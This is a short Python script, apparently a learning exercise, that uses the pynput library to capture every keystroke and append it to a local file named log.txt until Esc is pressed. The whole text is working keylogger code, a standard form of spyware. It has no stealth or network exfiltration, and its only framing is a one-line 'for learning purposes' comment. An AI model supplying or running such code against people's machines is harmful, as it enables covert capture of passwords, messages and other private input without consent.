# Description: This script logs all the keys pressed by the user and stores them in a file called log.txt
# this is for learning purposes
# developed using pynput library
# Key Package is used to get the key pressed by the user, Listener is used to listen to the key pressed by the user
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(f'{key.char}')
        except AttributeError:
            if key == Key.space:
                log.write(' ')
            else:
                log.write(f' {key} ')


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
